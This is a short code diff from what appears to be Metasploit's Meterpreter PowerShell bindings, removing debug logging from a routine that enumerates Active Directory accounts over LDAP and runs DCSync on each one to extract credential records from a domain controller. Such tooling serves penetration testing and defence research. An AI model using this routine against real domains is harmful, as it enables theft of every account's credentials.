@@ -88,8 +88,6 @@ namespace MSF.Powershell.Meterpreter
                 throw new ArgumentException("Domain parameter must be specified.");
             }
 
-            System.Diagnostics.Debug.WriteLine("[PSH BINDING - DCSYNCALL] Running against domain " + settings.Domain);
-
             using (var adRoot = new System.DirectoryServices.DirectoryEntry(string.Format("LDAP://{0}", settings.Domain)))
             using (var searcher = new System.DirectoryServices.DirectorySearcher(adRoot))
             {
@@ -100,14 +98,11 @@ namespace MSF.Powershell.Meterpreter
 
                 using (var searchResults = searcher.FindAll())
                 {
-                    System.Diagnostics.Debug.WriteLine("[PSH BINDING - DCSYNCALL] Search resulted in results: " + searchResults.Count.ToString());
                     foreach (System.DirectoryServices.SearchResult searchResult in searchResults)
                     {
                         if (searchResult != null)
                         {
                             var username = searchResult.Properties["samAccountName"][0].ToString();
-                            System.Diagnostics.Debug.WriteLine("[PSH BINDING - DCSYNCALL] Found account: " + username);
-
                             if (settings.IncludeMachineAccounts || !username.EndsWith("$"))
                             {
                                 var record = DcSync(string.Format("{0}\\{1}", settings.Domain, username), settings.DomainController, settings.DomainFqdn);
